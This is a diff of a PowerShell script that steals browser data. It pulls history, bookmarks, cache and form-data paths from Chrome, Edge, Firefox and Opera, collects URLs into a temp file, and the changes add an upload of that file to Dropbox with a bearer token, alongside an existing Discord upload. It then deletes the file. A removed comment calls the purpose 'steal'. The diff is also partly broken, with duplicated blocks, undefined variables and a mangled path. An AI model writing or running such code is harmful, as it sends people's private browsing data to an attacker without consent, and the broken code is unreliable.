@@ -1,24 +1,56 @@
 function Get-BrowserData {
+
     [CmdletBinding()]
     param (	
-        [Parameter (Position=1,Mandatory = $True)]
-        [string]$Browser,    
-        [Parameter (Position=1,Mandatory = $True)]
-        [string]$DataType 
+    [Parameter (Position=1,Mandatory = $True)]
+    [string]$Browser,    
+    [Parameter (Position=1,Mandatory = $True)]
+    [string]$DataType 
     ) 
 
     $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
 
-    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
-    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'cookies'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Cookies"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'cookies'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"}
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'cookies'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'cookies'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Cookies"}
+$Paths = @{
+    chrome = @{
+        history   = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+        bookmarks = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+        cache     = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Cache"
+        formdata  = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data"
+    }
 
-    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+    edge = @{
+        history   = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
+        bookmarks = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
+    }
+
+    opera = @{
+        history   = "$env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
+        bookmarks = "$env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
+    }
+
+    firefox = @{
+        history = "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
+    }
+}
+
+$Path = $Paths[$Browser][$DataType]
+
+if ($Paths.ContainsKey($Browser) -and $Paths[$Browser].ContainsKey($DataType)) {
+    $Path = $Paths[$Browser][$DataType]
+} else {
+    Write-Host "Invalid browser or datatype"
+}
+
+
+
+
+
+
+
+        if     ($Browser -eq 'chrome'  -and $DataType -eq 'cache')  {$Path = $CachePath}
+    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'form_data')  {$Path = $FormDataPath}
+
+        $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
     $Value | ForEach-Object {
         $Key = $_
         if ($Key -match $Search){
@@ -32,21 +64,60 @@ function Get-BrowserData {
     } 
 }
 
-# Steal both history and cookies
+    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+    $Value | ForEach-Object {
+        $Key = $_
+        if ($Key -match $Search){
+            New-Object -TypeName PSObject -Property @{
+                User = $env:UserName
+                Browser = $Browser
+                DataType = $DataType
+                Data = $_
+            }
+        }
+    } 
+
+
 Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt
-Get-BrowserData -Browser "edge" -DataType "cookies" >> $env:TMP\--BrowserData.txt
+
+Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
 
 Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\--BrowserData.txt
-Get-BrowserData -Browser "chrome" -DataType "cookies" >> $env:TMP\--BrowserData.txt
+
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP--BrowserData.txt
 
 Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData.txt
-Get-BrowserData -Browser "firefox" -DataType "cookies" >> $env:TMP\--BrowserData.txt
 
 Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt
-Get-BrowserData -Browser "opera" -DataType "cookies" >> $env:TMP\--BrowserData.txt
 
-# Upload output file to Discord
-#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
+
+# Upload output file to dropbox
+
+function DropBox-Upload {
+
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[Alias("f")]
+[string]$SourceFilePath
+) 
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $db
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\--BrowserData.txt}
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
 function Upload-Discord {
 
 [CmdletBinding()]
@@ -75,3 +146,4 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\--Browser
 
 ############################################################################################################################################################
 RI $env:TEMP/--BrowserData.txt
+
